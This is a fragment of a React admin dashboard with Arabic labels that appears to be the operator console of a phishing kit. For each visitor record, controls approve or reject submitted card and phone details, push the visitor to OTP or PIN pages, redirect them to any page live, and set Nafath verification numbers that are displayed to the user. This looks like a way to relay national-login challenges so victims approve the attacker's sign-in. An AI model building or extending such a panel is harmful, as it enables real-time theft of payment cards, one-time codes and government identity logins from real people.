                      <p className="text-xs font-semibold text-gray-700 mb-1">موافقة البطاقة</p>
                      <p className="text-[10px] text-gray-400 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة PIN | rejected=رفض</p>
                      <ApprovalActions record={selectedRecord} field="cardApproval" options={["pending", "otp", "approved", "rejected"]} onUpdate={handleUpdate} />
                    </div>

                    <div>
                      <p className="text-xs font-semibold text-gray-700 mb-1">موافقة OTP الجوال</p>
                      <p className="text-[10px] text-gray-400 mb-2">approved=انتقال لنفاذ | rejected=رفض | pending=انتظار</p>
                      <ApprovalActions record={selectedRecord} field="phoneOtpApproval" options={["pending", "approved", "rejected"]} onUpdate={handleUpdate} />
                    </div>

                    <div>
                      <p className="text-xs font-semibold text-gray-700 mb-1">موافقة الجوال</p>
                      <p className="text-[10px] text-gray-400 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة نفاذ | rejected=رفض</p>
                      <ApprovalActions record={selectedRecord} field="phoneApproval" options={["pending", "otp", "approved", "rejected"]} onUpdate={handleUpdate} />
                    </div>
                  </div>
                </Section>

                {/* ── Page Navigation ──────────────────────────────────── */}
                <Section title="توجيه الزائر" icon={Globe}>
                  <p className="text-[10px] text-gray-400 mb-2">اضغط على أي صفحة لتوجيه الزائر إليها فوراً</p>
                  <NavigateVisitorControl record={selectedRecord} onUpdate={handleUpdate} />
                </Section>

                {/* ── Text Fields ───────────────────────────────────────── */}
                <Section title="حقول التحكم" icon={Settings}>
                  <div className="space-y-4">
                    <div>
                      <p className="text-xs font-semibold text-gray-700 mb-1">رقم التحقق في نفاذ (authNumber)</p>
                      <p className="text-[10px] text-gray-400 mb-2">يظهر للمستخدم في نافذة نفاذ</p>
                      <TextFieldControl
                        key={"auth-" + selectedRecord.id + "-" + str(selectedRecord.authNumber)}
                        record={selectedRecord}
                        field="authNumber"
                        placeholder="مثال: 42"
                        onUpdate={handleUpdate}
                      />
                    </div>

                    <div>
                      <p className="text-xs font-semibold text-gray-700 mb-1">رمز نفاذ PIN (nafaz_pin)</p>
                      <p className="text-[10px] text-gray-400 mb-2">يظهر في صفحة /nafad كرقم التحقق</p>
                      <TextFieldControl
                        key={"pin-" + selectedRecord.id + "-" + str(selectedRecord.nafaz_pin)}
                        record={selectedRecord}
                        field="nafaz_pin"
                        placeholder="مثال: 58"
                        onUpdate={handleUpdate}
                      />
                    </div>
                  </div>
                </Section>

                {/* ── Timestamps ────────────────────────────────────────── */}
                <Section title="التوقيتات" icon={Clock} defaultOpen={false}>
                  <DetailRow icon={Clock} label="تاريخ الإنشاء" value={formatDate(str(selectedRecord.createdAt) || str(selectedRecord.createdDate))} />
                  <DetailRow icon={Clock} label="آخر تحديث" value={formatDate(str(selectedRecord.updatedAt))} />
                  <DetailRow icon={Clock} label="تاريخ الإكمال" value={formatDate(str(selectedRecord.completedDate))} />
                </Section>

                {/* ── Raw JSON ──────────────────────────────────────────── */}
                <Section title="البيانات الخام (JSON)" icon={FileText} defaultOpen={false}>
                  <pre className="bg-gray-900 text-green-400 p-4 rounded-lg text-xs overflow-x-auto max-h-64 leading-relaxed" dir="ltr">
                    {JSON.stringify(selectedRecord, null, 2)}
                  </pre>
                </Section>

                {/* Bottom spacer */}
                <div className="h-4" />
              </div>
            </div>
          </>
        ) : (
          <EmptyState />
        )}
      </main>
    </div>
  )
}
